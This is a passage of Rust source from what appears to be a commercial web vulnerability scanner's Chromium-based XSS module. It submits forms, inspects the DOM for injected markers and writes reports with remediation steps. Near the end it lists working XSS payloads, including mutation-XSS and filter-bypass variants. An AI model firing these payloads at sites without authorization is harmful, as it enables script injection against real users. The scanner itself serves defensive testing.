                        let escaped_payload = serde_json::to_string(&stored_payload)
                            .unwrap_or_else(|_| format!("\"{}\"", stored_payload));
                        let fill_js = format!(
                            r#"(function() {{
                                const el = document.querySelector({});
                                if (el) {{
                                    el.value = {};
                                }}
                            }})()"#,
                            escaped_selector, escaped_payload
                        );
                        let _ = tab.evaluate(&fill_js, false);
                    }
                }
            }

            info!("[Chromium-XSS] Submitting form {}", form_idx);

            let submit_js = format!(
                r#"(function() {{
                    const form = document.querySelectorAll('form')[{}];
                    if (form) {{
                        const btn = form.querySelector('[type="submit"], button:not([type="button"])');
                        if (btn) btn.click(); else form.submit();
                    }}
                }})()"#,
                form_idx
            );
            let _ = tab.evaluate(&submit_js, false);

            Self::poll_for_xss_or_stability(&tab, 800, 100);

            let _ = tab.evaluate(
                &format!("window.__xssMarker='{}'; window.__xssTriggered=false; window.__xssTriggerType='none';", marker),
                false
            );

            let input_names: Vec<String> = inputs
                .iter()
                .filter_map(|i| {
                    i.get("name")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())
                })
                .collect();
            let input_names_str = input_names.join(", ");

            if let Some(mut result) = Self::check_xss_triggered(&tab, url, &stored_payload)? {
                if result.xss_triggered {
                    info!("[Chromium-XSS] CONFIRMED stored XSS via form!");
                    result.parameter = Some(input_names_str.clone());
                    result.injection_point = Some("Hook interception".to_string());
                    results.push(result);
                    return Ok(results);
                }
            }

            let dom_check_js = format!(
                r#"
                (function() {{
                    const marker = '{}';
                    let xssFound = false;
                    let location = 'none';
                    let severity = 'NONE';

                    document.querySelectorAll('script').forEach(script => {{
                        const content = script.textContent || script.src || '';
                        if (content.includes(marker)) {{
                            xssFound = true;
                            location = 'SCRIPT tag';
                            severity = 'CRITICAL';
                        }}
                    }});

                    if (!xssFound) {{
                        const dangerousAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus',
                                                'onblur', 'onkeydown', 'onkeyup', 'onsubmit', 'onchange',
                                                'oninput', 'onmouseenter', 'ontoggle', 'onstart'];
                        document.querySelectorAll('*').forEach(el => {{
                            for (const attr of dangerousAttrs) {{
                                const val = el.getAttribute(attr);
                                if (val && val.includes(marker)) {{
                                    xssFound = true;
                                    location = el.tagName + '[' + attr + ']';
                                    severity = 'HIGH';
                                    return;
                                }}
                            }}
                        }});
                    }}

                    if (!xssFound) {{
                        document.querySelectorAll('[href], [src], [action]').forEach(el => {{
                            ['href', 'src', 'action'].forEach(attr => {{
                                const val = el.getAttribute(attr);
                                if (val && val.toLowerCase().startsWith('javascript:') && val.includes(marker)) {{
                                    xssFound = true;
                                    location = el.tagName + '[' + attr + '=javascript:]';
                                    severity = 'HIGH';
                                }}
                            }});
                        }});
                    }}

                    if (!xssFound) {{
                        document.querySelectorAll('iframe[srcdoc]').forEach(iframe => {{
                            const srcdoc = iframe.getAttribute('srcdoc') || '';
                            if (srcdoc.includes(marker)) {{
                                xssFound = true;
                                location = 'IFRAME[srcdoc]';
                                severity = 'HIGH';
                            }}
                        }});
                    }}

                    if (xssFound) {{
                        window.__xssTriggered = true;
                        window.__xssTriggerType = 'dom-executable';
                        window.__xssMessage = 'Executable XSS found in: ' + location;
                        window.__xssSeverity = severity;
                        return location;
                    }}
                    return false;
                }})()
            "#,
                marker
            );

            if let Ok(dom_result) = tab.evaluate(&dom_check_js, false) {
                let location = dom_result
                    .value
                    .and_then(|v| v.as_str().map(|s| s.to_string()));
                if location.is_some() && location.as_ref().map(|s| s != "false").unwrap_or(false) {
                    let loc_str = location.clone().unwrap_or_else(|| "DOM".to_string());
                    info!("[Chromium-XSS] CONFIRMED stored XSS at: {}", loc_str);
                    if let Some(mut result) = Self::check_xss_triggered(&tab, url, &stored_payload)?
                    {
                        result.parameter = Some(input_names_str.clone());
                        result.injection_point = Some(loc_str.clone());
                        result.dialog_message = Some(format!(
                            "Stored via form #{} fields [{}]. Found at: {}",
                            form_idx, input_names_str, loc_str
                        ));
                        results.push(result);
                        return Ok(results);
                    }
                }
            }

            let _ = tab.navigate_to(url);
            Self::poll_for_xss_or_stability(&tab, 300, 100);

            let _ = tab.evaluate(
                &format!("window.__xssMarker='{}'; window.__xssTriggered=false; window.__xssTriggerType='none';", marker),
                false
            );
        }

        Ok(results)
    }

    fn poll_for_xss_or_stability(tab: &Tab, max_wait_ms: u64, poll_interval_ms: u64) -> bool {
        let start = std::time::Instant::now();
        let mut stable_count = 0;

        while start.elapsed().as_millis() < max_wait_ms as u128 {
            if let Ok(result) = tab.evaluate("window.__xssTriggered || false", false) {
                if result.value.and_then(|v| v.as_bool()).unwrap_or(false) {
                    return true;
                }
            }

            let ready_js = r#"document.readyState === 'complete' ? 'ready' : 'loading'"#;
            if let Ok(result) = tab.evaluate(ready_js, false) {
                let is_ready = result
                    .value
                    .as_ref()
                    .and_then(|v| v.as_str())
                    .map(|s| s == "ready")
                    .unwrap_or(false);
                if is_ready {
                    stable_count += 1;
                    if stable_count >= 2 {
                        return false;
                    }
                } else {
                    stable_count = 0;
                }
            }

            std::thread::sleep(Duration::from_millis(poll_interval_ms));
        }
        false
    }

    fn test_single_url(
        browser: &SharedBrowser,
        url: &str,
        marker: &str,
    ) -> Result<XssDetectionResult> {
        // Validate URL scheme - reject dangerous schemes
        let url_lower = url.to_lowercase();
        if url_lower.starts_with("javascript:")
            || url_lower.starts_with("data:")
            || url_lower.starts_with("vbscript:")
        {
            debug!("[Chromium-XSS] Skipping unsafe URL scheme: {}", url);
            return Ok(XssDetectionResult {
                xss_triggered: false,
                trigger_type: XssTriggerType::None,
                payload: url.to_string(),
                dialog_message: Some("Skipped: unsafe URL scheme".to_string()),
                url: url.to_string(),
                severity: XssSeverity::Unknown,
                stack_trace: None,
                source: None,
                timestamp: None,
                parameter: None,
                injection_point: None,
            });
        }

        // Use TabGuard for automatic cleanup on drop (RAII pattern)
        // This prevents tab leaks on panics or early returns
        let guard = browser.new_guarded_tab(marker)?;
        let tab = guard.tab();
        tab.set_default_timeout(Duration::from_secs(6));

        if let Err(e) = tab.navigate_to(url) {
            debug!("[Chromium-XSS] Navigation failed for {}: {}", url, e);
            return Ok(XssDetectionResult {
                xss_triggered: false,
                trigger_type: XssTriggerType::None,
                payload: url.to_string(),
                dialog_message: None,
                url: url.to_string(),
                severity: XssSeverity::Unknown,
                stack_trace: None,
                source: None,
                timestamp: None,
                parameter: None,
                injection_point: None,
            });
        }

        let _ = tab.wait_until_navigated();

        if Self::poll_for_xss_or_stability(tab, 500, 100) {
            return Self::check_xss_triggered(tab, url, url)?
                .ok_or_else(|| anyhow::anyhow!("Failed to check XSS result"));
        }

        let _ = tab.evaluate(
            &format!("window.__xssMarker='{}'; if(!window.__xssTriggered) window.__xssTriggerType='none';", marker),
            false
        );

        let _ = tab.evaluate(
            r#"
            (function() {
                document.querySelectorAll('input, textarea').forEach(el => {
                    try { el.focus(); el.blur(); } catch(e) {}
                });
                document.querySelectorAll('a, button, [onclick], [onmouseover]').forEach(el => {
                    try {
                        el.dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));
                    } catch(e) {}
                });
            })();
        "#,
            false,
        );

        Self::poll_for_xss_or_stability(tab, 300, 100);

        Self::check_xss_triggered(tab, url, url)?
            .ok_or_else(|| anyhow::anyhow!("Failed to check XSS result"))
    }

    fn check_xss_triggered(
        tab: &Tab,
        url: &str,
        payload: &str,
    ) -> Result<Option<XssDetectionResult>> {
        let check_js = r#"
            (function() {
                const executions = window.__xssExecutions || [];
                const latest = executions.length > 0 ? executions[executions.length - 1] : null;
                return JSON.stringify({
                    triggered: window.__xssTriggered || false,
                    type: window.__xssTriggerType || 'none',
                    message: window.__xssMessage || '',
                    severity: window.__xssSeverity || 'UNKNOWN',
                    stack: latest ? latest.stack : null,
                    source: latest ? latest.source : null,
                    timestamp: latest ? latest.timestamp : null,
                    executions: executions.length
                });
            })()
        "#;

        let result = tab.evaluate(check_js, false)?;

        if let Some(value) = result.value {
            if let Some(json_str) = value.as_str() {
                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(json_str) {
                    let triggered = parsed
                        .get("triggered")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false);
                    let trigger_str = parsed
                        .get("type")
                        .and_then(|v| v.as_str())
                        .unwrap_or("none");
                    let message = parsed
                        .get("message")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());
                    let severity_str = parsed
                        .get("severity")
                        .and_then(|v| v.as_str())
                        .unwrap_or("UNKNOWN");
                    let stack = parsed
                        .get("stack")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());
                    let source = parsed
                        .get("source")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());
                    let timestamp = parsed.get("timestamp").and_then(|v| v.as_u64());

                    let trigger_type = match trigger_str {
                        "alert" => XssTriggerType::AlertDialog,
                        "confirm" => XssTriggerType::ConfirmDialog,
                        "prompt" => XssTriggerType::PromptDialog,
                        "eval" | "Function" | "setTimeout" | "setInterval" => XssTriggerType::Eval,
                        "innerHTML" | "outerHTML" | "insertAdjacentHTML" => {
                            XssTriggerType::InnerHtml
                        }
                        "document.write" | "document.writeln" => XssTriggerType::DocumentWrite,
                        "location.assign" | "location.replace" => XssTriggerType::LocationChange,
                        "fetch-url" | "img.src" => XssTriggerType::DataExfil,
                        "fetch-response" | "xhr-response" => XssTriggerType::InnerHtml,
                        s if s.contains("shadow") => XssTriggerType::ShadowDom,
                        s if s.starts_with("dom-") => XssTriggerType::DomExecution,
                        s if s.starts_with("js-") => XssTriggerType::Eval,
                        s if s.contains("DOM") => XssTriggerType::DomExecution,
                        _ => XssTriggerType::DomExecution,
                    };

                    let severity = match severity_str {
                        "CRITICAL" => XssSeverity::Critical,
                        "HIGH" => XssSeverity::High,
                        "MEDIUM" => XssSeverity::Medium,
                        "LOW" => XssSeverity::Low,
                        _ => XssSeverity::Unknown,
                    };

                    return Ok(Some(XssDetectionResult {
                        xss_triggered: triggered,
                        trigger_type,
                        payload: payload.to_string(),
                        dialog_message: message,
                        url: url.to_string(),
                        severity,
                        stack_trace: stack,
                        source,
                        timestamp,
                        parameter: None,
                        injection_point: None,
                    }));
                }
            }
        }

        Ok(None)
    }

    fn create_vulnerability(&self, result: &XssDetectionResult) -> Result<Vulnerability> {
        let trigger_desc = match result.trigger_type {
            XssTriggerType::AlertDialog => "JavaScript alert() executed",
            XssTriggerType::ConfirmDialog => "JavaScript confirm() executed",
            XssTriggerType::PromptDialog => "JavaScript prompt() executed",
            XssTriggerType::DomExecution => "DOM mutation detected with payload",
            XssTriggerType::ShadowDom => "Shadow DOM injection detected",
            XssTriggerType::Eval => "Code execution via eval/Function",
            XssTriggerType::InnerHtml => "DOM sink innerHTML/outerHTML triggered",
            XssTriggerType::DocumentWrite => "document.write injection detected",
            XssTriggerType::LocationChange => "Location manipulation detected",
            XssTriggerType::DataExfil => "Data exfiltration attempt detected",
            XssTriggerType::None => "Unknown trigger",
        };

        let xss_type = if result.payload.contains("STORED") {
            "Stored XSS"
        } else if result.payload.contains("DOM") || result.payload.starts_with('#') {
            "DOM-based XSS"
        } else {
            "Reflected XSS"
        };

        let (severity, cvss) = match result.severity {
            XssSeverity::Critical => (Severity::Critical, 9.6),
            XssSeverity::High => (Severity::High, 8.2),
            XssSeverity::Medium => (Severity::Medium, 6.5),
            XssSeverity::Low => (Severity::Low, 4.3),
            XssSeverity::Unknown => (Severity::High, 7.5),
        };

        let mut evidence_parts = vec![
            format!("Trigger: {}", trigger_desc),
            format!("Severity: {:?}", result.severity),
            format!("Payload: {}", result.payload),
        ];

        if let Some(ref injection_point) = result.injection_point {
            evidence_parts.push(format!("Found in: {}", injection_point));
        }
        if let Some(ref param) = result.parameter {
            evidence_parts.push(format!("Injected via: {}", param));
        }
        if let Some(ref msg) = result.dialog_message {
            evidence_parts.push(format!("Message: {}", msg));
        }
        if let Some(ref source) = result.source {
            evidence_parts.push(format!("Source: {}", source));
        }
        if let Some(ts) = result.timestamp {
            evidence_parts.push(format!("Timestamp: {}ms", ts));
        }
        if let Some(ref stack) = result.stack_trace {
            evidence_parts.push(format!("Stack trace:\n{}", stack));
        }

        Ok(Vulnerability {
            id: format!("xss_{}", uuid::Uuid::new_v4()),
            vuln_type: format!("{} (CONFIRMED)", xss_type),
            severity,
            confidence: Confidence::High,
            category: "Injection".to_string(),
            url: result.url.clone(),
            parameter: result.parameter.clone(),
            payload: result.payload.clone(),
            description: format!(
                "CONFIRMED {} vulnerability ({:?} severity). {}. Payload executed in real browser context.",
                xss_type, result.severity, trigger_desc
            ),
            evidence: Some(evidence_parts.join("\n")),
            cwe: "CWE-79".to_string(),
            cvss,
            verified: true,
            false_positive: false,
            remediation: "1. Encode all user input before rendering\n\
                         2. Use Content Security Policy (CSP)\n\
                         3. Use HTTP-only cookies\n\
                         4. Sanitize HTML with DOMPurify\n\
                         5. Use frameworks with auto-escaping (React, Vue, Angular)".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
            ml_data: None,
        })
    }

    /// Parallel XSS scanning - tests multiple URLs concurrently using browser tabs
    /// This provides 3-5x speedup over sequential scanning
    ///
    /// Optimizations:
    /// - Batch URLs into single spawn_blocking call (reduces spawn overhead)
    /// - Early exit: skip DOM phase if reflected XSS found
    /// - Concurrency capped at 5 (Chrome stability limit)
    pub async fn scan_urls_parallel(
        &self,
        urls: &[String],
        config: &ScanConfig,
        shared_browser: Option<&SharedBrowser>,
        concurrency: usize,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // License check - Chromium XSS is a premium feature
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            warn!("[Chromium-XSS] Parallel scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        let concurrency = concurrency.min(5).max(1); // Limit to 1-5 parallel tabs
        info!(
            "[Chromium-XSS] Starting parallel XSS scan: {} URLs with {} concurrent tabs",
            urls.len(),
            concurrency
        );

        let browser: SharedBrowser = match shared_browser {
            Some(b) => b.clone(),
            None => {
                warn!("[Chromium-XSS] No shared browser, creating temporary instance");
                SharedBrowser::new()?
            }
        };

        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;

        // Process URLs in chunks - use batch processing to reduce spawn_blocking overhead
        // Instead of 1 spawn per URL, we do 1 spawn per chunk (5x fewer spawns)
        for (chunk_idx, chunk) in urls.chunks(concurrency).enumerate() {
            let chunk_start = chunk_idx * concurrency + 1;
            let chunk_end = (chunk_start + chunk.len() - 1).min(urls.len());
            info!(
                "    [XSS] Testing URLs {}-{}/{}",
                chunk_start,
                chunk_end,
                urls.len()
            );

            // Single spawn_blocking for entire chunk - batch processing
            let chunk_urls: Vec<String> = chunk.to_vec();
            let mode = config.scan_mode.clone();
            let browser_clone = browser.clone();

            let batch_results = tokio::task::spawn_blocking(move || {
                // Use catch_unwind to prevent panics from leaking tabs
                std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                    Self::run_batch_xss_tests_sync(&chunk_urls, &mode, &browser_clone)
                }))
            })
            .await;

            // Process batch results
            match batch_results {
                Ok(Ok(url_results)) => {
                    for (url, result) in url_results {
                        match result {
                            Ok(results) => {
                                for r in results {
                                    if r.xss_triggered {
                                        if let Ok(vuln) = self.create_vulnerability(&r) {
                                            let vuln_key =
                                                format!("{}:{:?}", r.url, r.trigger_type);
                                            let mut confirmed =
                                                self.confirmed_vulns.lock().unwrap();
                                            if !confirmed.contains(&vuln_key) {
                                                confirmed.insert(vuln_key);
                                                info!("    [XSS] CONFIRMED XSS at: {}", url);
                                                all_vulnerabilities.push(vuln);
                                            }
                                        }
                                    }
                                    total_tests += 1;
                                }
                            }
                            Err(e) => {
                                debug!("[Chromium-XSS] Error scanning {}: {}", url, e);
                            }
                        }
                    }
                }
                Ok(Err(_)) => {
                    warn!("[Chromium-XSS] Batch panicked, cleaning up browser tabs");
                    // Force browser tab cleanup on panic
                    let _ = browser.cleanup_stale_tabs();
                }
                Err(e) => {
                    warn!("[Chromium-XSS] Task join error: {}", e);
                }
            }
        }

        info!(
            "[Chromium-XSS] Parallel scan complete: {} confirmed XSS, {} tests across {} URLs",
            all_vulnerabilities.len(),
            total_tests,
            urls.len()
        );

        Ok((all_vulnerabilities, total_tests))
    }

    fn get_xss_payloads(mode: &ScanMode) -> Vec<String> {
        let base = vec![
            "<img src=x onerror=alert('MARKER')>".to_string(),
            "<svg onload=alert('MARKER')>".to_string(),
            "'\"><script>alert('MARKER')</script>".to_string(),
            "<body onload=alert('MARKER')>".to_string(),
        ];

        let advanced = vec![
            "<details open ontoggle=alert('MARKER')>".to_string(),
            "<input onfocus=alert('MARKER') autofocus>".to_string(),
            "<script>alert`MARKER`</script>".to_string(),
        ];

        let mxss = vec![
            "<img src=\"`><script>alert('MARKER')</script>\">".to_string(),
            "<noscript><p title=\"</noscript><script>alert('MARKER')</script>\">".to_string(),
            "<form><button formaction=\"javascript:alert('MARKER')\">".to_string(),
        ];

        let waf_bypass = vec![
            "<ScRiPt>alert('MARKER')</sCrIpT>".to_string(),
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('MARKER')>".to_string(),
            "<iframe srcdoc=\"<script>alert('MARKER')</script>\">".to_string(),
        ];

        match mode {
            ScanMode::Fast => base[..2].to_vec(),
            ScanMode::Normal => base,
            ScanMode::Thorough => {
                let mut all = base;
                all.extend(advanced);
                all.extend(mxss);
                all
            }
            ScanMode::Insane | ScanMode::Intelligent => {
                let mut all = base;
                all.extend(advanced);
                all.extend(mxss);
                all.extend(waf_bypass);
                all
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xss_payloads() {
        let payloads = ChromiumXssScanner::get_xss_payloads(&ScanMode::Normal);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.contains("MARKER")));
    }

    #[test]
    fn test_trigger_types() {
        assert_eq!(XssTriggerType::AlertDialog, XssTriggerType::AlertDialog);
        assert_ne!(XssTriggerType::AlertDialog, XssTriggerType::ConfirmDialog);
    }
}
